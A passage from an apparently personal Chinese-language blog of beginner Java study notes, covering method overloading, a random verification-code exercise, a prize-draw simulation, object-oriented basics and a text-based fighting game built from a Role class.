&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;int&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> a == b;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// byte</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(<span class="type">byte</span> a, <span class="type">byte</span> b)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;byte&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> a == b;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//short</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(<span class="type">short</span> a, <span class="type">short</span> b)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;short&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> a == b;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//long</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">compare</span><span class="params">(<span class="type">long</span> a, <span class="type">long</span> b)</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;long&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> a == b;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day7-综合练习"><a class="header-anchor" href="#Day7-综合练习">¶</a>Day7 综合练习</h2>
<h3 id="练习三：验证码"><a class="header-anchor" href="#练习三：验证码">¶</a>练习三：验证码</h3>
<ul>
<li><strong>需求</strong>：定义⽅法实现随机产⽣⼀个5位的验证码</li>
<li><strong>验证码格式</strong>：⻓度为5，前四位是⼤写字⺟或者⼩写字⺟，最后⼀位是数字</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 需求：</span></span><br><span class="line"><span class="comment">            定义⽅法实现随机产⽣⼀个5位的验证码</span></span><br><span class="line"><span class="comment">            验证码格式：</span></span><br><span class="line"><span class="comment">            ⻓度为5</span></span><br><span class="line"><span class="comment">            前四位是⼤写字⺟或者⼩写字⺟</span></span><br><span class="line"><span class="comment">            最后⼀位是数字 </span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 分析</span></span><br><span class="line">        <span class="comment">// 1.大写字母和小写字母都放到数组中</span></span><br><span class="line">        <span class="type">char</span>[] chs = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">52</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; chs.length; i ++) &#123;</span><br><span class="line">            <span class="comment">// ASCII表</span></span><br><span class="line">            <span class="keyword">if</span> (i &lt;= <span class="number">25</span>) &#123;</span><br><span class="line">                <span class="comment">// 添加小写字母</span></span><br><span class="line">                chs[i] = (<span class="type">char</span>)(<span class="number">97</span> + i);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 添加大写字母</span></span><br><span class="line">                chs[i] = (<span class="type">char</span>)(<span class="number">65</span> + i - <span class="number">26</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 定义⼀个字符串类型的变量，⽤来记录最终的结果</span></span><br><span class="line">		<span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 2.随机抽取4次</span></span><br><span class="line">		<span class="comment">// 随机抽取数组中的索引</span></span><br><span class="line">		<span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">			<span class="type">int</span> <span class="variable">randomIndex</span> <span class="operator">=</span> r.nextInt(chs.length);</span><br><span class="line">			<span class="comment">// 利⽤随机索引，获取对应的元素</span></span><br><span class="line">			<span class="comment">// System.out.println(chs[randomIndex]);</span></span><br><span class="line">			result = result + chs[randomIndex];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// System.out.println(result);</span></span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 3.随机抽取⼀个数字0~9</span></span><br><span class="line">		<span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> r.nextInt(<span class="number">10</span>);</span><br><span class="line">        </span><br><span class="line">		<span class="comment">// 拼接⽣成最终的结果</span></span><br><span class="line">		result = result + number;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 打印最终结果</span></span><br><span class="line">		System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="练习八：抽奖"><a class="header-anchor" href="#练习八：抽奖">¶</a>练习八：抽奖</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 解法一 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test9</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">/* 需求：</span></span><br><span class="line"><span class="comment">⼀个⼤V直播抽奖，奖品是现⾦红包，分别有&#123;2, 588 , 888, 1000, 10000&#125;五个奖⾦。</span></span><br><span class="line"><span class="comment">请使⽤代码模拟抽奖，打印出每个奖项，奖项的出现顺序要随机且不重复。</span></span><br><span class="line"><span class="comment">打印效果如下：（随机顺序，不⼀定是下⾯的顺序）</span></span><br><span class="line"><span class="comment">888元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">588元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">10000元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">1000元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">2元的奖⾦被抽出*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 分析：</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 1.定义数组表⽰奖池</span></span><br><span class="line"><span class="type">int</span>[] arr = &#123;<span class="number">2</span>, <span class="number">588</span>, <span class="number">888</span>, <span class="number">1000</span>, <span class="number">10000</span>&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 2.定义新数组⽤于存储抽奖的结果</span></span><br><span class="line"><span class="type">int</span>[] newArr = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length];</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 3.抽奖</span></span><br><span class="line"><span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">    </span><br><span class="line"><span class="comment">//因为有5个奖项，所以这⾥要循环5次</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; ) &#123;</span><br><span class="line">    <span class="comment">//获取随机索引</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">randomIndex</span> <span class="operator">=</span> r.nextInt(arr.length);</span><br><span class="line">    <span class="comment">//获取奖项</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">prize</span> <span class="operator">=</span> arr[randomIndex];</span><br><span class="line">    <span class="comment">//判断当前的奖项是否存在，如果存在则重新抽取，如果不存在，就表⽰是有效奖项</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> contains(newArr, prize);</span><br><span class="line">    <span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">        <span class="comment">//把当前抽取到的奖项添加到newArr当中</span></span><br><span class="line">        newArr[i] = prize;</span><br><span class="line">        <span class="comment">//添加完毕之后，移动索引</span></span><br><span class="line">        i++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//4.遍历newArr</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; newArr.length; i++) &#123;</span><br><span class="line">	System.out.println(newArr[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">// 判断prize在数组当中是否存在</span></span><br><span class="line"><span class="comment">// 存在：true</span></span><br><span class="line"><span class="comment">// 不存在：false</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(<span class="type">int</span>[] arr,<span class="type">int</span> prize)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[i] == prize)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 解法二 */</span></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test10</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 需求：</span></span><br><span class="line"><span class="comment">        ⼀个⼤V直播抽奖，奖品是现⾦红包，分别有&#123;2, 588 , 888, 1000, 10000&#125;五个奖⾦。</span></span><br><span class="line"><span class="comment">        请使⽤代码模拟抽奖，打印出每个奖项，奖项的出现顺序要随机且不重复。</span></span><br><span class="line"><span class="comment">        打印效果如下：（随机顺序，不⼀定是下⾯的顺序）</span></span><br><span class="line"><span class="comment">        888元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">        588元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">        10000元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">        1000元的奖⾦被抽出</span></span><br><span class="line"><span class="comment">        2元的奖⾦被抽出*/</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1.把奖池内所有奖项的顺序打乱</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">2</span>, <span class="number">588</span>, <span class="number">888</span>, <span class="number">1000</span>, <span class="number">10000</span>&#125;;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i ++) &#123;</span><br><span class="line">            <span class="comment">// 获取随机索引</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">randomIndex</span> <span class="operator">=</span> r.nextInt(arr.length);</span><br><span class="line">            <span class="comment">// 拿着i与随机索引randomIndex上的值进行交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            arr[i] = arr[randomIndex];</span><br><span class="line">            arr[randomIndex] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2.遍历奖池，从0索引开始获取每一个奖项</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i ++) &#123;</span><br><span class="line">            System.out.println(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day8-面向对象"><a class="header-anchor" href="#Day8-面向对象">¶</a>Day8 面向对象</h2>
<h3 id="概念一些"><a class="header-anchor" href="#概念一些">¶</a>概念一些</h3>
<ul>
<li>类
<ul>
<li>类的理解
<ul>
<li>类是对现实⽣活中⼀类具有共同属性和⾏为的事物的抽象</li>
<li>类是对象的数据类型，类是具有相同属性和⾏为的⼀组对象的集合</li>
<li>简单理解：类就是对现实事物的⼀种描述</li>
</ul>
</li>
<li>类的组成
<ul>
<li>属性：指事物的特征，例如：⼿机事物（品牌，价格，尺⼨）</li>
<li>⾏为：指事物能执⾏的操作，例如：⼿机事物（打电话，发短信）</li>
</ul>
</li>
<li>类和对象的关系
<ul>
<li>类：类是对现实⽣活中⼀类具有共同属性和⾏为的事物的抽象</li>
<li>对象：是能够看得到摸的着的真实存在的实体</li>
<li>简单理解：<strong>类是对事物的⼀种描述，对象则为具体存在的事物</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="对象内存图"><a class="header-anchor" href="#对象内存图">¶</a>对象内存图</h3>
<ul>
<li><strong>总结</strong></li>
<li>多个对象在堆内存中，都有不同的内存划分，成员变量存储在各⾃的内存区域中，成员⽅法多个对象共⽤的⼀份</li>
<li>这个没太懂</li>
</ul>
<h3 id="封装"><a class="header-anchor" href="#封装">¶</a>封装</h3>
<ul>
<li>private修饰变量+getter&amp;setter方法</li>
</ul>
<h3 id="构造方法"><a class="header-anchor" href="#构造方法">¶</a>构造方法</h3>
<h4 id="标准类制作"><a class="header-anchor" href="#标准类制作">¶</a>标准类制作</h4>
<ol>
<li>
<p>类名需要⻅名知意</p>
</li>
<li>
<p>成员变量使⽤private修饰</p>
</li>
<li>
<p>提供⾄少两个构造⽅法</p>
<ol>
<li>⽆参构造⽅法</li>
<li>带全部参数的构造⽅法</li>
</ol>
</li>
<li>
<p>get和set⽅法</p>
<ul>
<li>提供每⼀个成员变量对应的setXxx()/getXxx()</li>
</ul>
</li>
<li>
<p>如果还有其他⾏为，也需要写上</p>
</li>
</ol>
<h2 id="Day9-面向对象综合训练"><a class="header-anchor" href="#Day9-面向对象综合训练">¶</a>Day9 面向对象综合训练</h2>
<h3 id="文字版格斗游戏"><a class="header-anchor" href="#文字版格斗游戏">¶</a>文字版格斗游戏</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 功能和人物信息等定义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Role</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> blood;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">char</span> gender;</span><br><span class="line">    <span class="keyword">private</span> String face;<span class="comment">//长相是随机的</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    String[] boyfaces = &#123;<span class="string">&quot;风流俊雅&quot;</span>, <span class="string">&quot;气宇轩昂&quot;</span>, <span class="string">&quot;相貌英俊&quot;</span>, <span class="string">&quot;五官端正&quot;</span>, <span class="string">&quot;相貌平平&quot;</span>, <span class="string">&quot;一塌糊涂&quot;</span>, <span class="string">&quot;面目狰狞&quot;</span>&#125;;</span><br><span class="line">    String[] girlfaces = &#123;<span class="string">&quot;美奂绝伦&quot;</span>, <span class="string">&quot;沉鱼落雁&quot;</span>, <span class="string">&quot;婷婷玉立&quot;</span>, <span class="string">&quot;身材娇好&quot;</span>, <span class="string">&quot;相貌平平&quot;</span>, <span class="string">&quot;相貌简陋&quot;</span>, <span class="string">&quot;惨不忍睹&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//attack 攻击描述：</span></span><br><span class="line">    String[] attacks_desc = &#123;</span><br><span class="line">            <span class="string">&quot;%s使出了一招【背心钉】，转到对方的身后，一掌向%s背心的灵台穴拍去。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s使出了一招【游空探爪】，飞起身形自半空中变掌为抓锁向%s。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s大喝一声，身形下伏，一招【劈雷坠地】，捶向%s双腿。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s运气于掌，一瞬间掌心变得血红，一式【掌心雷】，推向%s。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s阴手翻起阳手跟进，一招【没遮拦】，结结实实的捶向%s。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%s上步抢身，招中套招，一招【劈挂连环】，连环攻向%s。&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//injured 受伤描述：</span></span><br><span class="line">    String[] injureds_desc = &#123;</span><br><span class="line">            <span class="string">&quot;结果%s退了半步，毫发无损&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果给%s造成一处瘀伤&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果一击命中，%s痛得弯下腰&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果%s痛苦地闷哼了一声，显然受了点内伤&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果%s摇摇晃晃，一跤摔倒在地&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果%s脸色一下变得惨白，连退了好几步&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果『轰』的一声，%s口中鲜血狂喷而出&quot;</span>,</span><br><span class="line">            <span class="string">&quot;结果%s一声惨叫，像滩软泥般塌了下去&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Role</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Role</span><span class="params">(String name, <span class="type">int</span> blood, <span class="type">char</span> gender)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.blood = blood;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">        <span class="comment">//随机长相</span></span><br><span class="line">        setFace(gender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">getGender</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setGender</span><span class="params">(<span class="type">char</span> gender)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.gender = gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFace</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> face;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFace</span><span class="params">(<span class="type">char</span> gender)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="comment">//长相是随机的</span></span><br><span class="line">        <span class="keyword">if</span> (gender == <span class="string">&#x27;男&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//从boyfaces里面随机长相</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(boyfaces.length);</span><br><span class="line">            <span class="built_in">this</span>.face = boyfaces[index];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (gender == <span class="string">&#x27;女&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//从girlfaces里面随机长相</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(girlfaces.length);</span><br><span class="line">            <span class="built_in">this</span>.face = girlfaces[index];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.face = <span class="string">&quot;面目狰狞&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getBlood</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> blood;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBlood</span><span class="params">(<span class="type">int</span> blood)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.blood = blood;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义一个方法用于攻击别人</span></span><br><span class="line">    <span class="comment">//思考：谁攻击谁？</span></span><br><span class="line">    <span class="comment">//Role r1 = new Role（）；</span></span><br><span class="line">    <span class="comment">//Role r2 = new Role（）；</span></span><br><span class="line">    <span class="comment">//r1.攻击(r2);</span></span><br><span class="line">    <span class="comment">//方法的调用者去攻击参数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">(Role role)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> r.nextInt(attacks_desc.length);</span><br><span class="line">        <span class="type">String</span> <span class="variable">KungFu</span> <span class="operator">=</span> attacks_desc[index];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//输出一个攻击的效果</span></span><br><span class="line">        System.out.printf(KungFu, <span class="built_in">this</span>.getName(), role.getName());</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//计算造成的伤害 1 ~ 20</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hurt</span> <span class="operator">=</span> r.nextInt(<span class="number">20</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//剩余血量</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">remainBoold</span> <span class="operator">=</span> role.getBlood() - hurt;</span><br><span class="line">        <span class="comment">//对剩余血量做一个验证，如果为负数了，就修改为0</span></span><br><span class="line">        remainBoold = remainBoold &lt; <span class="number">0</span> ? <span class="number">0</span> : remainBoold;</span><br><span class="line">        <span class="comment">//修改一下挨揍的人的血量</span></span><br><span class="line">        role.setBlood(remainBoold);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//受伤的描述</span></span><br><span class="line">        <span class="comment">//血量&gt; 90 0索引的描述</span></span><br><span class="line">        <span class="comment">//80 ~  90  1索引的描述</span></span><br><span class="line">        <span class="comment">//70 ~  80  2索引的描述</span></span><br><span class="line">        <span class="comment">//60 ~  70  3索引的描述</span></span><br><span class="line">        <span class="comment">//40 ~  60  4索引的描述</span></span><br><span class="line">        <span class="comment">//20 ~  40  5索引的描述</span></span><br><span class="line">        <span class="comment">//10 ~  20  6索引的描述</span></span><br><span class="line">        <span class="comment">//小于10的   7索引的描述</span></span><br><span class="line">        <span class="keyword">if</span> (remainBoold &gt; <span class="number">90</span>) &#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">0</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">80</span> &amp;&amp; remainBoold &lt;= <span class="number">90</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">1</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">70</span> &amp;&amp; remainBoold &lt;= <span class="number">80</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">2</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">60</span> &amp;&amp; remainBoold &lt;= <span class="number">70</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">3</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">40</span> &amp;&amp; remainBoold &lt;= <span class="number">60</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">4</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">20</span> &amp;&amp; remainBoold &lt;= <span class="number">40</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">5</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(remainBoold &gt; <span class="number">10</span> &amp;&amp; remainBoold &lt;= <span class="number">20</span>)&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">6</span>], role.getName());</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.printf(injureds_desc[<span class="number">7</span>], role.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showRoleInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;姓名为：&quot;</span> + getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;血量为：&quot;</span> + getBlood());</span><br><span class="line">        System.out.println(<span class="string">&quot;性别为：&quot;</span> + getGender());</span><br><span class="line">        System.out.println(<span class="string">&quot;长相为：&quot;</span> + getFace());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 应用部分</span></span><br><span class="line"><span class="keyword">package</span> com.itheima.test2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GameTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.创建第一个角色</span></span><br><span class="line">        <span class="type">Role</span> <span class="variable">r1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Role</span>(<span class="string">&quot;乔峰&quot;</span>,<span class="number">100</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line">        <span class="comment">//2.创建第二个角色</span></span><br><span class="line">        <span class="type">Role</span> <span class="variable">r2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Role</span>(<span class="string">&quot;鸠摩智&quot;</span>,<span class="number">100</span>,<span class="string">&#x27;男&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//展示一下角色的信息</span></span><br><span class="line">        r1.showRoleInfo();</span><br><span class="line">        r2.showRoleInfo();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.开始格斗 回合制游戏</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="comment">//r1开始攻击r2</span></span><br><span class="line">            r1.attack(r2);</span><br><span class="line">            <span class="comment">//判断r2的剩余血量</span></span><br><span class="line">            <span class="keyword">if</span>(r2.getBlood() == <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(r1.getName() + <span class="string">&quot; K.O了&quot;</span> + r2.getName());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//r2开始攻击r1</span></span><br><span class="line">            r2.attack(r1);</span><br><span class="line">            <span class="keyword">if</span>(r1.getBlood() == <span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println(r2.getName() + <span class="string">&quot; K.O了&quot;</span> + r1.getName());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>还有好几个有意思的，但是我懒了，后面实践有需要再看吧</li>
<li>这些实践例子在上部的P192及以前</li>
</ul>
<h2 id="扩展：键盘录入"><a class="header-anchor" href="#扩展：键盘录入">¶</a>扩展：键盘录入</h2>
<h3 id="涉及方法"><a class="header-anchor" href="#涉及方法">¶</a>涉及方法</h3>
<h4 id="next-nextLine"><a class="header-anchor" href="#next-nextLine">¶</a>next()  nextLine()</h4>
<ul>
